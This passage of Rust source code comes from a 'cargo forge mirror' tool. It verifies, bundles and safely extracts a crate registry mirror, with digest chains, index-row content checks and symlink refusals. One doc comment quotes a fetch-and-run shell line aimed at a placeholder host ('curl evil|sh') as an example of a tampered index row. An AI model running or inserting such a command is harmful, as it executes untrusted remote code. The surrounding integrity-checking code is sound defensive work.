                .map_err(|e| format!("cannot inspect {}: {e}", entry.path().display()))?;
            if kind.is_symlink() {
                return Err(format!(
                    "REFUSED symlink inside the mirror: {}",
                    entry.path().display()
                ));
            }
            let name = entry.file_name();
            let name = name.to_str().ok_or_else(|| {
                format!(
                    "REFUSED non-UTF-8 mirror path component: {}",
                    entry.path().display()
                )
            })?;
            let child = if relative.as_os_str().is_empty() {
                name.to_string()
            } else {
                format!("{}/{name}", relative.to_string_lossy())
            };
            validate_entry_path(&child)?;
            if kind.is_dir() {
                pending.push(PathBuf::from(&child));
            } else if kind.is_file() {
                out.push(child);
            } else {
                return Err(format!(
                    "REFUSED mirror entry that is neither a directory nor a regular file: {}",
                    entry.path().display()
                ));
            }
        }
    }
    out.sort();
    Ok(out)
}

/// `cargo forge mirror bundle --dir DIR --out FILE`.
pub fn run_bundle(root: &Path, dir: &Path, out: &Path) -> Result<Outcome, String> {
    bundle(root, dir, out, &mirror::RowAnchor::discover()).map(|(o, _)| o)
}

/// Verify the mirror against `Cargo.lock`, then write one deterministic bundle.
///
/// The [`mirror::verify`] pass is a PRECONDITION, not a courtesy: bundling is
/// the step that turns a directory into a thing other machines will trust, and
/// a drifted mirror must not be able to acquire that status. A RED verify stops
/// the run with the drift report attached.
pub fn bundle(
    root: &Path,
    dir: &Path,
    out: &Path,
    anchor: &mirror::RowAnchor,
) -> Result<(Outcome, BundleStats), String> {
    let verified = mirror::verify(root, dir, anchor)?;
    if !verified.ok {
        let mut log = String::new();
        let _ = writeln!(
            log,
            "mirror bundle — REFUSED: {} does not verify against Cargo.lock, so it cannot be \
             bundled. The verify report follows verbatim:",
            dir.display()
        );
        for line in verified.log.lines() {
            let _ = writeln!(log, "  {line}");
        }
        let _ = writeln!(log, "  FAIL");
        return Ok((Outcome { ok: false, log }, BundleStats::default()));
    }
    reject_symlinks_under(dir)?;

    let pkgs = mirror::locked_registry_packages(root)?;
    let lock_path = root.join("Cargo.lock");
    let lock_bytes = std::fs::read(&lock_path)
        .map_err(|e| format!("cannot read {}: {e}", lock_path.display()))?;
    let lock_sha256 = sha256_hex(&lock_bytes);
    let lock_registry_sha256 = registry_slice_digest(&pkgs);

    // Pass 1: per-file digests and the payload digest, streamed. Nothing is
    // buffered but the row list.
    let paths = collect_files(dir)?;
    let mut payload = aterm_digest::Sha256::new();
    let mut files = Vec::with_capacity(paths.len());
    let mut payload_bytes = 0u64;
    for path in &paths {
        let full = dir.join(path);
        let (sha256, bytes) = hash_file(&full)?;
        let mut handle =
            File::open(&full).map_err(|e| format!("cannot read {}: {e}", full.display()))?;
        let mut buffer = [0u8; IO_CHUNK_BYTES];
        loop {
            let read = handle
                .read(&mut buffer)
                .map_err(|e| format!("cannot read {}: {e}", full.display()))?;
            if read == 0 {
                break;
            }
            payload.update(&buffer[..read]);
        }
        payload_bytes = payload_bytes.saturating_add(bytes);
        files.push(FileEntry {
            path: path.clone(),
            sha256,
            bytes,
        });
    }
    let payload_sha256 = digest_hex(payload.finalize());

    let mut packages: Vec<(String, String, String)> = pkgs
        .iter()
        .map(|p| (p.name.clone(), p.version.clone(), p.checksum.clone()))
        .collect();
    packages.sort();
    let manifest = Manifest {
        lock_sha256,
        lock_registry_sha256: lock_registry_sha256.clone(),
        payload_sha256: payload_sha256.clone(),
        payload_bytes,
        files,
        packages,
    };
    // Written and read back through the same parser, so a manifest this tool
    // cannot validate is never handed to anybody.
    let manifest_text = manifest.render();
    let reparsed = parse_manifest(&manifest_text)
        .map_err(|why| format!("internal: the manifest just rendered does not parse: {why}"))?;
    if reparsed != manifest {
        return Err("internal: the rendered manifest does not round-trip".to_string());
    }
    let manifest_sha256 = sha256_hex(manifest_text.as_bytes());
    let manifest_bytes = manifest_text.len() as u64;

    // Pass 2: write, re-hashing every entry as it is copied. A file that
    // changed between the passes is refused rather than shipped under the
    // digest it used to have.
    let bundle_sha256 = atomic_replace(out, |sink| {
        let mut whole = aterm_digest::Sha256::new();
        let mut emit = |bytes: &[u8]| -> Result<(), String> {
            whole.update(bytes);
            sink.write_all(bytes)
                .map_err(|e| format!("cannot write {}: {e}", out.display()))
        };
        emit(format!("{MAGIC}\n").as_bytes())?;
        emit(format!("manifest-sha256 {manifest_sha256}\n").as_bytes())?;
        emit(format!("manifest-bytes {manifest_bytes}\n").as_bytes())?;
        emit(b"\n")?;
        emit(manifest_text.as_bytes())?;
        for entry in &manifest.files {
            let full = dir.join(&entry.path);
            let mut handle =
                File::open(&full).map_err(|e| format!("cannot read {}: {e}", full.display()))?;
            let mut digest = aterm_digest::Sha256::new();
            let mut copied = 0u64;
            let mut buffer = [0u8; IO_CHUNK_BYTES];
            loop {
                let read = handle
                    .read(&mut buffer)
                    .map_err(|e| format!("cannot read {}: {e}", full.display()))?;
                if read == 0 {
                    break;
                }
                digest.update(&buffer[..read]);
                copied = copied.saturating_add(read as u64);
                emit(&buffer[..read])?;
            }
            let got = digest_hex(digest.finalize());
            if got != entry.sha256 || copied != entry.bytes {
                return Err(format!(
                    "REFUSED mirror file changed during bundling: {} (expected {} / {} bytes, \
                     got {got} / {copied} bytes)",
                    full.display(),
                    entry.sha256,
                    entry.bytes
                ));
            }
        }
        Ok(digest_hex(whole.finalize()))
    })?;

    let bundle_bytes = std::fs::metadata(out)
        .map_err(|e| format!("cannot inspect {}: {e}", out.display()))?
        .len();
    let st = BundleStats {
        files: manifest.files.len(),
        packages: manifest.packages.len(),
        payload_bytes,
        bundle_bytes,
        manifest_bytes,
        bundle_sha256,
        payload_sha256,
        lock_registry_sha256,
    };
    let mut log = String::new();
    let _ = writeln!(
        log,
        "mirror bundle — {} -> {}",
        dir.display(),
        out.display()
    );
    let _ = writeln!(
        log,
        "  entries: {} file(s); packages: {}; payload: {} bytes; bundle: {} bytes \
         (manifest {} bytes)",
        st.files, st.packages, st.payload_bytes, st.bundle_bytes, st.manifest_bytes
    );
    let _ = writeln!(log, "  payload-sha256 {}", st.payload_sha256);
    let _ = writeln!(log, "  lock-registry-sha256 {}", st.lock_registry_sha256);
    let _ = writeln!(log, "  bundle-sha256  {}", st.bundle_sha256);
    let _ = match anchor.why_absent() {
        None => writeln!(
            log,
            "  `mirror verify` passed first, and every index row in it was ALSO judged \
             byte-for-byte against cargo's own sparse-index cache."
        ),
        Some(why) => writeln!(
            log,
            "  `mirror verify` passed first, but row CONTENT was NOT anchored — {why}. This \
             bundle's `deps` and `features` are whatever the directory held."
        ),
    };
    let _ = writeln!(
        log,
        "  UNSIGNED. `bundle-sha256` is the number a release signature covers, and it is the \
         only thing that can prove this file is the one that came off this machine; signing \
         and index upload are the owner's ceremony (TODO(mirror-delivery-atpkg))."
    );
    let _ = writeln!(log, "  PASS");
    Ok((Outcome { ok: true, log }, st))
}

// ---------------------------------------------------------------------------
// check-bundle
// ---------------------------------------------------------------------------

/// The largest `index/` entry `check-bundle` will hold in memory in order to
/// READ it rather than merely hash it.
///
/// MEASURED on this lock's mirror: 443 index files, 848,259 bytes in total,
/// largest 57,979 (`objc2-ui-kit`). 4 MiB is ~70x the largest real one and
/// still a fixed ceiling on what an untrusted manifest can make this process
/// allocate — and only ever one entry at a time. A bigger entry is refused
/// rather than read: an index file that size is not a mirror's.
const MAX_INDEX_ENTRY_BYTES: u64 = 4 * 1024 * 1024;

/// What a workspace's `Cargo.lock` is allowed to say about a bundle in one
/// pass.
///
/// The two questions a lock can answer are NOT the same question, and before
/// this type they were welded together behind one `Option<&Path>`:
///
///   * "was this bundle built for THIS package set" — a digest comparison, and
///     a fair refusal for `check-bundle`, whose whole job is to judge a bundle
///     against the workspace it is standing in.
///   * "does each row still declare the dependencies the lock RESOLVED" — the
///     only row anchor that travels with a delivery, because it needs no cargo
///     cache and no network.
///
/// `unbundle` legitimately declines the first (a mirror for another lock is
/// still extractable) and by passing `None` it was silently declining the
/// second as well — on the delivery target, which is precisely the machine
/// with no cache, where that anchor is the ONLY one left. [`Self::EdgesOnly`]
/// is the shape that separates them.
#[derive(Clone, Copy, Debug)]
pub enum LockUse<'a> {
    /// No workspace: nothing from a lock is consulted, and the verdict says so.
    None,
    /// The bundle must have been built for this workspace's lock, and its rows
    /// are judged against the edges that lock resolved.
    Match(&'a Path),
    /// The digest is NOT compared — a bundle is extracted on its own terms —
    /// but the resolved edges are still applied to every package the lock and
    /// the bundle have in common.
    EdgesOnly(&'a Path),
}

impl<'a> LockUse<'a> {
    /// The workspace to read a lock from, if any.
    fn root(self) -> Option<&'a Path> {
        match self {
            Self::None => Option::None,
            Self::Match(root) | Self::EdgesOnly(root) => Some(root),
        }
    }

    /// Whether a bundle built for a DIFFERENT lock is a refusal here.
    fn compares_digest(self) -> bool {
        matches!(self, Self::Match(_))
    }
}

/// How far row CONTENT could be judged in one pass.
///
/// Returned, not just printed: `unbundle` runs the same pass and its verdict
/// has to carry the same numbers, or a run that anchored NOTHING reads exactly
/// like a run that anchored everything. It did — a fully anchored extraction
/// and a cacheless one printed the same four lines.
#[derive(Debug, Default)]
pub struct RowTally {
    /// Index rows read out of the bundle's own `index/` entries.
    pub rows: usize,
    /// Rows proven byte-for-byte against cargo's sparse-index cache.
    pub anchored: usize,
    /// Rows for which no such proof was available here.
    pub unanchored: usize,
    /// Rows whose package the workspace lock also names, so its resolved
    /// dependency edges could be required of the row.
    pub edges: usize,
    /// The first reason a row could not be anchored.
    pub why: Option<String>,
}

impl RowTally {
    /// The anchor paragraph, written identically by every verb that reads rows
    /// — so `check-bundle` and `unbundle` cannot drift into telling an
    /// operator two different stories about the same file.
    fn report(&self, log: &mut String, lock: LockUse<'_>) {
        let _ = writeln!(
            log,
            "  index rows read: {}; anchored byte-for-byte against cargo's own sparse-index \
             cache: {}",
            self.rows, self.anchored
        );
        if let Some(why) = &self.why {
            let _ = writeln!(log, "  {} row(s) NOT anchored — {why}", self.unanchored);
        }
        let _ = match lock.root() {
            Some(_) => writeln!(
                log,
                "  Cargo.lock's resolved dependency edges required of {} of those {} row(s) — \
                 the anchor that needs no cache and no network, and the only one left on a \
                 delivery target. It records dependency NAMES: a lock carries no features at \
                 all.",
                self.edges, self.rows
            ),
            Option::None => writeln!(
                log,
                "  Cargo.lock's resolved dependency edges were NOT required of any row: no \
                 workspace lock was read in this run, so that anchor did not fire either."
            ),
        };
    }
}

/// One index file's plan: the package name the file belongs to, and the
/// `(version, cksum)` rows it must hold, in order.
type IndexRows = (String, Vec<(String, String)>);

/// Every `index/` path a manifest's `pkg` ledger implies, with the rows that
/// file must hold, in the order [`mirror::emit`] writes them (ascending
/// version, which is the order a sorted ledger already arrives in).
fn index_plan(
    packages: &[(String, String, String)],
) -> Result<BTreeMap<String, IndexRows>, String> {
    let mut plan: BTreeMap<String, IndexRows> = BTreeMap::new();
    for (name, version, cksum) in packages {
        // The bundle-relative spelling, which is what a `file` row carries —
        // `mirror_shape` builds the same string from the same helper.
        let path = format!("index/{}", mirror::index_rel_slashed(name)?);
        plan.entry(path)
            .or_insert_with(|| (name.clone(), Vec::new()))
            .1
            .push((version.clone(), cksum.clone()));
    }
    Ok(plan)
}

/// Judge one `index/…` entry's BYTES against the ledger that claims it.
///
/// This is the check the delivery format did not have. `check-bundle` proved
/// an index entry's digest matched the manifest and then never looked at what
/// was inside it, so a row replaced by `#!/bin/sh curl evil|sh` — re-sealed, so
/// every digest agreed — rode through PASS and landed on disk. Structure first
/// (it parses, it is the row the ledger claims, it is not yanked), then the
/// two anchors that can speak to its CONTENT.
#[allow(clippy::too_many_arguments)]
fn judge_index_entry(
    path: &str,
    bytes: &[u8],
    name: &str,
    want: &[(String, String)],
    anchor: &mirror::RowAnchor,
    lock_edges: &BTreeMap<(String, String), Vec<String>>,
    tally: &mut RowTally,
    problems: &mut Vec<String>,
) {
    let Ok(text) = std::str::from_utf8(bytes) else {
        problems.push(format!(
            "REFUSED bundle entry `{path}`: not UTF-8. A registry index file is one JSON line \
             per version and nothing else."
        ));
        return;
    };
    if !text.ends_with('\n') {
        problems.push(format!(
            "REFUSED bundle entry `{path}`: does not end with a newline — `mirror emit` \
             terminates every row it writes"
        ));
        return;
    }
    let lines: Vec<&str> = text.lines().collect();
    if lines.len() != want.len() {
        problems.push(format!(
            "REFUSED bundle entry `{path}`: {} line(s), but this bundle's `pkg` ledger claims \
             {} version(s) of `{name}`. A mirror index file holds exactly the rows its ledger \
             names, one per line.",
            lines.len(),
            want.len()
        ));
        return;
    }
    for (line, (version, cksum)) in lines.iter().zip(want) {
        tally.rows += 1;
        let row = match mirror::parse_index_row(line, Path::new(path)) {
            Ok(row) => row,
            Err(why) => {
                problems.push(format!("REFUSED bundle index row: {why}"));
                continue;
            }
        };
        if row.name != name || row.version != *version {
            problems.push(format!(
                "REFUSED bundle entry `{path}`: a row reads `{} {}` where the `pkg` ledger puts \
                 `{name} {version}`",
                row.name, row.version
            ));
            continue;
        }
        if row.checksum != *cksum {
            problems.push(format!(
                "REFUSED bundle index row `{name} {version}`: its cksum {} disagrees with the \
                 `pkg` ledger's {cksum}",
                row.checksum
            ));
            continue;
        }
        if row.yanked {
            problems.push(format!(
                "REFUSED bundle index row `{name} {version}`: `yanked:true` — a mirror must \
                 never yank a version its own ledger carries"
            ));
            continue;
        }
        // Structure is settled; what remains is whether the CONTENT is
        // upstream's, which no digest in this file can answer.
        match anchor.judge(name, version, line) {
            RowProvenance::Upstream => tally.anchored += 1,
            RowProvenance::Unanchored(why) => {
                tally.unanchored += 1;
                tally.why.get_or_insert(why);
            }
            RowProvenance::Drifted(why) => problems.push(format!("REFUSED: {why}")),
        }
        if let Some(resolved) = lock_edges.get(&(name.to_string(), version.clone())) {
            tally.edges += 1;
            if let Some(why) = mirror::judge_row_against_lock_edges(name, version, line, resolved) {
                problems.push(format!("REFUSED: {why}"));
            }
        }
    }
}

/// `cargo forge mirror check-bundle --file FILE`. Verifies WITHOUT unpacking.
pub fn run_check_bundle(root: &Path, file: &Path) -> Result<Outcome, String> {
    check_bundle(LockUse::Match(root), file, &mirror::RowAnchor::discover()).map(|(o, _, _)| o)
}

/// Read a bundle end to end and prove every link of the chain. Writes nothing,
/// creates nothing, and never needs the mirror the bundle came from.
///
/// When `root` is given, the bundle's lock anchors are ALSO compared against
/// that workspace's live `Cargo.lock` — reported as agreement or drift, and
/// drift is a failure: a bundle for another lock is not a bundle for this one.
/// Passing `None` checks the bundle purely on its own terms.
///
/// `anchor` decides whether index-row CONTENT can be judged at all. Every
/// digest in a bundle is INSIDE the bundle, so an attacker who edits a row
/// re-seals them and they all agree again; [`mirror::RowAnchor`] is the one
/// question that reaches outside the file. When it is absent the verdict says
/// so, in the number of rows it could not anchor and in words.
pub fn check_bundle(
    lock: LockUse<'_>,
    file: &Path,
    anchor: &mirror::RowAnchor,
) -> Result<(Outcome, Manifest, RowTally), String> {
    let Opened {
        mut reader,
        manifest,
        header_raw,
        manifest_raw,
    } = match open_bundle(file) {
        Ok(opened) => opened,
        // A bundle that fails at the header is judged, not shrugged at: same
        // RED verdict and same exit code as a payload byte that does not hash.
        Err(OpenError::Bad(why)) => {
            let mut log = String::new();
            let _ = writeln!(log, "mirror check-bundle — {}", file.display());
            let _ = writeln!(log, "  BAD: {why}");
            let _ = writeln!(log, "  FAIL");
            return Ok((
                Outcome { ok: false, log },
                Manifest::rejected(),
                RowTally::default(),
            ));
        }
        Err(OpenError::Unreadable(why)) => return Err(why),
    };

    let mut problems: Vec<String> = Vec::new();

    // --- the workspace lock, read BEFORE the payload ----------------------
    // It answers two questions and the second one needs answering per row: is
    // this bundle's lock digest ours, and what did the lock RESOLVE as each
    // package's dependencies. That second record is the only anchor on row
    // content that travels with a delivery — it carries no features, but a
    // row that quietly drops a resolved dependency is caught by it on a
    // machine with no cargo cache at all.
    let mut lock_note = None;
    let mut lock_edges: BTreeMap<(String, String), Vec<String>> = BTreeMap::new();
    if let Some(root) = lock.root() {
        match mirror::locked_registry_packages(root) {
            Ok(pkgs) => {
                let live = registry_slice_digest(&pkgs);
                // THE EDGES ARE TAKEN EITHER WAY. A bundle built for another
                // lock is not `unbundle`'s refusal to make, but the packages
                // the two locks share are still anchored by what this one
                // resolved, and `lock_edges.get` simply misses the rest.
                for p in &pkgs {
                    lock_edges.insert((p.name.clone(), p.version.clone()), p.dependencies.clone());
                }
                if !lock.compares_digest() {
                    lock_note = Some(format!(
                        "  lock: digest NOT compared — this run extracts a bundle on its own \
                         terms. Its rows are still judged against the dependency edges this \
                         workspace's {} registry package(s) resolved.",
                        pkgs.len()
                    ));
                } else if live == manifest.lock_registry_sha256 {
                    // `lock-registry-sha256` is proven by `parse_manifest` to be
                    // the digest of THIS bundle's own `pkg` ledger, so the count
                    // reported here is the bundle's. The comparison is still made
                    // rather than argued: "the digest implies the count" is the
                    // reasoning that let a 2-package bundle print `494`.
                    if pkgs.len() != manifest.packages.len() {
                        problems.push(format!(
                            "the two lock digests agree and the counts do not: {} registry \
                             package(s) in this workspace, {} in the bundle. Refused rather \
                             than reasoned about.",
                            pkgs.len(),
                            manifest.packages.len()
                        ));
                    }
                    lock_note = Some(format!(
                        "  lock: MATCHES this workspace — {} registry package(s) at \
                         lock-registry-sha256 {live}, and that digest is proven to be the \
                         digest of THIS BUNDLE's own `pkg` ledger, so the count is the \
                         bundle's.",
                        manifest.packages.len()
                    ));
                } else {
                    problems.push(format!(
                        "this bundle was built for a DIFFERENT lock: bundle \
                         lock-registry-sha256 {}, this workspace {live} ({} package(s) here, \
                         {} in the bundle)",
                        manifest.lock_registry_sha256,
                        pkgs.len(),
                        manifest.packages.len()
                    ));
                }
            }
            Err(why) => lock_note = Some(format!("  lock: not compared ({why})")),
        }
    }

    // --- what each `index/` entry must contain ----------------------------
    let plan = match index_plan(&manifest.packages) {
        Ok(plan) => plan,
        Err(why) => {
            problems.push(format!("REFUSED bundle package ledger: {why}"));
            BTreeMap::new()
        }
    };

    let mut payload = aterm_digest::Sha256::new();
    let mut buffer = vec![0u8; IO_CHUNK_BYTES];
    let mut tally = RowTally::default();
    // THE FILE'S OWN BYTES, in the order they were read — header, manifest,
    // then every payload byte below. `bundle-sha256` is what `shasum -a 256`
    // prints for this file and what a signature would cover, so it is computed
    // from bytes read and never from fields parsed.
    let mut whole = aterm_digest::Sha256::new();
    whole.update(&header_raw);
    whole.update(&manifest_raw);

    for entry in &manifest.files {
        // Index entries are READ, not merely hashed. One at a time, and only
        // when the manifest's own size for it is sane.
        let mut collected = match plan.get(entry.path.as_str()) {
            Some(_) if entry.bytes > MAX_INDEX_ENTRY_BYTES => {
                problems.push(format!(
                    "REFUSED bundle entry `{}`: {} bytes of registry index metadata, over the \
                     {MAX_INDEX_ENTRY_BYTES}-byte ceiling — not read",
                    entry.path, entry.bytes
                ));
                None
            }
            Some(_) => Some(Vec::with_capacity(
                usize::try_from(entry.bytes).unwrap_or(0),
            )),
            None => None,
        };
        let mut digest = aterm_digest::Sha256::new();
        let mut left = entry.bytes;
        while left > 0 {
            let want = usize::try_from(left.min(IO_CHUNK_BYTES as u64)).unwrap_or(IO_CHUNK_BYTES);
            let read = reader
                .read(&mut buffer[..want])
                .map_err(|e| format!("cannot read {}: {e}", file.display()))?;
            if read == 0 {
                problems.push(format!(
                    "REFUSED truncated bundle: `{}` ends {left} bytes early",
                    entry.path
                ));
                break;
            }
            digest.update(&buffer[..read]);
            payload.update(&buffer[..read]);
            whole.update(&buffer[..read]);
            if let Some(bytes) = &mut collected {
                bytes.extend_from_slice(&buffer[..read]);
            }
            left -= read as u64;
        }
        if left > 0 {
            break;
        }
        let got = digest_hex(digest.finalize());
        if got != entry.sha256 {
            problems.push(format!(
                "`{}`: payload bytes hash to {got}, manifest says {}",
                entry.path, entry.sha256
            ));
            continue;
        }
        if let (Some(bytes), Some((name, want))) = (collected, plan.get(entry.path.as_str())) {
            judge_index_entry(
                &entry.path,
                &bytes,
                name,
                want,
                anchor,
                &lock_edges,
                &mut tally,
                &mut problems,
            );
        }
    }
    // Trailing bytes are a refusal, not a shrug: content nobody's digest covers
    // is content a reader might one day be taught to honour.
    let mut extra = [0u8; 1];
    match reader.read(&mut extra) {
        Ok(0) => {}
        Ok(_) => problems.push(
            "REFUSED trailing bytes after the last bundle entry — no digest covers them"
                .to_string(),
        ),
        Err(e) => return Err(format!("cannot read {}: {e}", file.display())),
    }
    let payload_got = digest_hex(payload.finalize());
    if payload_got != manifest.payload_sha256 && problems.is_empty() {
        problems.push(format!(
            "payload hashes to {payload_got}, manifest says {}",
            manifest.payload_sha256
        ));
    }
    let bundle_sha256 = digest_hex(whole.finalize());

    let ok = problems.is_empty();
    let mut log = String::new();
    let _ = writeln!(log, "mirror check-bundle — {}", file.display());
    let _ = writeln!(
        log,
        "  entries: {}; packages: {}; payload: {} bytes",
        manifest.files.len(),
        manifest.packages.len(),
        manifest.payload_bytes
    );
    if ok {
        let _ = writeln!(log, "  bundle-sha256  {bundle_sha256}");
    } else {
        // NOT printed on a red verdict, on purpose: this digest covers the
        // bytes the manifest accounts for, and a bundle that failed is one
        // whose byte count is in dispute. A number that is only sometimes
        // `shasum -a 256` is worse than no number.
        let _ = writeln!(
            log,
            "  bundle-sha256  not reported — this bundle did not verify"
        );
    }
    if let Some(note) = lock_note {
        let _ = writeln!(log, "{note}");
    }
    tally.report(&mut log, lock);
    if ok {
        let _ = writeln!(
            log,
            "  chain: header -> manifest digest -> canonical form -> the mirror shape -> \
             payload digest -> every entry digest -> every package cksum -> every index row \
             (it parses, it is the row the ledger claims, it is not yanked). Nothing was \
             written."
        );
        let _ = writeln!(
            log,
            "  SCOPE — this proves INTEGRITY (every byte is the byte its own digest names) and \
             SHAPE (a mirror, and nothing else, at any depth). It does NOT prove PROVENANCE: \
             every digest here lives INSIDE the file, so whoever can edit the file re-seals \
             them and they agree again. A bundle can be internally perfect and still not be \
             the one the owner emitted. The anchors that reach outside it are cargo's own \
             sparse-index cache (counted above; absent on a delivery target), `Cargo.lock`'s \
             resolved dependency edges (counted above; a lock records NO features), and the \
             owner's signature over `bundle-sha256` — the only \
             one left on a machine with neither cache nor network, and deliberately outside \
             this tool (TODO(mirror-delivery-atpkg))."
        );
    }
    for problem in &problems {
        let _ = writeln!(log, "  BAD: {problem}");
    }
    let _ = writeln!(log, "  {}", if ok { "PASS" } else { "FAIL" });
    Ok((Outcome { ok, log }, manifest, tally))
}

// ---------------------------------------------------------------------------
// unbundle
// ---------------------------------------------------------------------------

/// `cargo forge mirror unbundle --file FILE --out DIR [--force]`.
///
/// `root` is passed as [`LockUse::EdgesOnly`]: a bundle built for another lock
/// is still extractable, but the edges THIS lock resolved are the only row
/// anchor that survives on a machine with no cargo cache, and a delivery
/// target is that machine.
pub fn run_unbundle(root: &Path, file: &Path, out: &Path, force: bool) -> Result<Outcome, String> {
    unbundle(
        file,
        out,
        force,
        LockUse::EdgesOnly(root),
        &mirror::RowAnchor::discover(),
    )
}

/// Why the OUTPUT side said no, split by whose fault it is — the same split
/// [`OpenError`] makes for the input side, and for the same reason: the exit
/// code is the answer a script reads.
///
/// A tree this tool refuses to write into is a VERDICT (`exit::FAIL`): the run
/// happened, it reached a conclusion, and the conclusion is no. A filesystem
/// that could not be read or written is `exit::COULD_NOT_RUN`. Before this
/// split every output-side refusal — a planted symlink, a populated directory,
/// a path that is not a directory — printed the word REFUSED and exited 3,
/// which says "I could not run" about a judgement the tool had just made.
enum OutError {
    Refused(String),
    Unreadable(String),
}

/// The house convention is that a judged refusal starts with `REFUSED` and an
/// environment failure does not, so that prefix is what classifies the strings
/// [`mirror::atomic_replace`] and [`mirror::reject_symlinks_under`] return.
fn output_error(why: String) -> OutError {
    if why.starts_with("REFUSED") {
        OutError::Refused(why)
    } else {
        OutError::Unreadable(why)
    }
}

/// Prove the destination tree is one this tool will write into, BEFORE it
/// writes anything: `--out` itself, the emptiness rule, no symlink anywhere
/// under it, and — for every entry — that each ancestor is a directory (or
/// absent) and the destination is absent or a plain file.
///
/// The last part is what makes a green `check-bundle` mean "extractable": a
/// path conflict that would abort extraction halfway is found here, with
/// nothing created.
fn prepare_output(out: &Path, manifest: &Manifest, force: bool) -> Result<(), OutError> {
    match std::fs::symlink_metadata(out) {
        Ok(meta) if meta.file_type().is_symlink() => {
            return Err(OutError::Refused(format!(
                "REFUSED output symlink {}",
                out.display()
            )));
        }
        Ok(meta) if !meta.is_dir() => {
            return Err(OutError::Refused(format!(
                "REFUSED output path that is not a directory: {}",
                out.display()
            )));
        }
        Ok(_) => {
            // A POPULATED output directory is refused by default. `unbundle`'s
            // whole delivery model is "download a bundle, unbundle it", and
            // silently replacing files already in the target tree is how a
            // delivered bundle rewrites something the operator did not offer.
            // The shape rule already bounds WHICH paths a bundle may name, so
            // `--force` cannot reach outside a mirror; the default still
            // refuses, because a mirror the operator did not put there is not
            // one this tool should quietly replace either.
            let mut entries = std::fs::read_dir(out)
                .map_err(|e| OutError::Unreadable(format!("cannot read {}: {e}", out.display())))?;
            if let Some(first) = entries.next() {
                let first = first.map_err(|e| {
                    OutError::Unreadable(format!(
                        "cannot read an entry under {}: {e}",
                        out.display()
                    ))
                })?;
                if !force {
                    return Err(OutError::Refused(format!(
                        "REFUSED non-empty output directory {} (it already holds `{}`) — \
                         extracting here would replace files this bundle did not put there. \
                         Name an empty or absent directory, or pass `--force` to extract into \
                         it anyway.",
                        out.display(),
                        first.file_name().to_string_lossy()
                    )));
                }
            }
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            std::fs::create_dir_all(out).map_err(|e| {
                OutError::Unreadable(format!("cannot create {}: {e}", out.display()))
            })?;
        }
        Err(e) => {
            return Err(OutError::Unreadable(format!(
                "cannot inspect {}: {e}",
                out.display()
            )));
        }
    }
    // ONCE, not once per entry. This walk used to run inside the extraction
    // loop over a tree that grows with every write — O(n^2), measured 12.4s
    // for 939 entries — while proving the same thing each time. What the loop
    // needs per entry is that the entry's OWN parents are real directories,
    // and that is checked below in time linear in the number of directories.
    reject_symlinks_under(out).map_err(output_error)?;

    let mut checked: BTreeSet<PathBuf> = BTreeSet::new();
    for entry in &manifest.files {
        validate_entry_path(&entry.path).map_err(OutError::Refused)?;
        let destination = out.join(&entry.path);
        let mut ancestor = out.to_path_buf();
        let parts: Vec<&str> = entry.path.split('/').collect();
        // Every component but the last: those are the directories this entry
        // needs, and each is proven once however many entries share it.
        for part in &parts[..parts.len() - 1] {
            ancestor.push(part);
            if checked.contains(&ancestor) {
                continue;
            }
            match std::fs::symlink_metadata(&ancestor) {
                Ok(meta) if meta.file_type().is_symlink() => {
                    return Err(OutError::Refused(format!(
                        "REFUSED output symlink {}",
                        ancestor.display()
                    )));
                }
                Ok(meta) if !meta.is_dir() => {
                    return Err(OutError::Refused(format!(
                        "REFUSED output path {}: `{}` needs to be a directory and is not",
                        destination.display(),
                        ancestor.display()
                    )));
                }
                Ok(_) => {}
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(e) => {
                    return Err(OutError::Unreadable(format!(
                        "cannot inspect {}: {e}",
                        ancestor.display()
                    )));
                }
            }
            checked.insert(ancestor.clone());
        }
        match std::fs::symlink_metadata(&destination) {
            Ok(meta) if meta.file_type().is_symlink() => {
                return Err(OutError::Refused(format!(
                    "REFUSED output symlink {}",
                    destination.display()
                )));
            }
            Ok(meta) if !meta.is_file() => {
                return Err(OutError::Refused(format!(
                    "REFUSED output path with wrong file type: {}",
                    destination.display()
                )));
            }
            Ok(_) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
            Err(e) => {
                return Err(OutError::Unreadable(format!(
                    "cannot inspect {}: {e}",
                    destination.display()
                )));
            }
        }
    }
    Ok(())
}

/// A RED unbundle verdict: the run reached a conclusion, and the conclusion is
/// that nothing was extracted.
fn unbundle_refused(file: &Path, out: &Path, why: &str) -> Outcome {
    let mut log = String::new();
    let _ = writeln!(
        log,
        "mirror unbundle — {} -> {}",
        file.display(),
        out.display()
    );
    let _ = writeln!(log, "  {why}");
    let _ = writeln!(log, "  NOTHING was extracted.");
    let _ = writeln!(log, "  FAIL");
    Outcome { ok: false, log }
}

/// Extract, but only after [`check_bundle`] has proven the whole chain over
/// the same file AND [`prepare_output`] has proven the destination tree.
/// Every entry is re-hashed as it is written, and every entry is stat'd again
/// afterwards, so the count this reports is the filesystem's and not the
/// manifest's.
pub fn unbundle(
    file: &Path,
    out: &Path,
    force: bool,
    lock: LockUse<'_>,
    anchor: &mirror::RowAnchor,
) -> Result<Outcome, String> {
    // FIRST. Whether a bundle matches some workspace's lock DIGEST is
    // `check-bundle`'s question and not extraction's, so callers pass
    // [`LockUse::EdgesOnly`] — but the edges themselves are not a workspace
    // question, they are the row anchor that travels with a delivery, and
    // dropping them here left the delivery-target verb running neither anchor
    // on the delivery target. A machine that can tell an edited row from
    // upstream's must refuse to WRITE one, not discover it afterwards.
    let (verdict, manifest, tally) = check_bundle(lock, file, anchor)?;
    if !verdict.ok {
        let mut log = String::new();
        let _ = writeln!(
            log,
            "mirror unbundle — REFUSED: {} does not verify, so NOTHING was extracted. The \
             check-bundle report follows verbatim:",
            file.display()
        );
        for line in verdict.log.lines() {
            let _ = writeln!(log, "  {line}");
        }
        let _ = writeln!(log, "  FAIL");
        return Ok(Outcome { ok: false, log });
    }

    match prepare_output(out, &manifest, force) {
        Ok(()) => {}
        Err(OutError::Refused(why)) => return Ok(unbundle_refused(file, out, &why)),
        Err(OutError::Unreadable(why)) => return Err(why),
    }

    // Re-opened for the write pass; the verdict above already proved the whole
    // chain over these same bytes, so a failure here is a file that changed
    // underneath the run.
    let Opened { mut reader, .. } = open_bundle(file).map_err(|e| match e {
        OpenError::Bad(why) | OpenError::Unreadable(why) => format!(
            "REFUSED: {} stopped verifying between the check pass and extraction: {why}",
            file.display()
        ),
    })?;
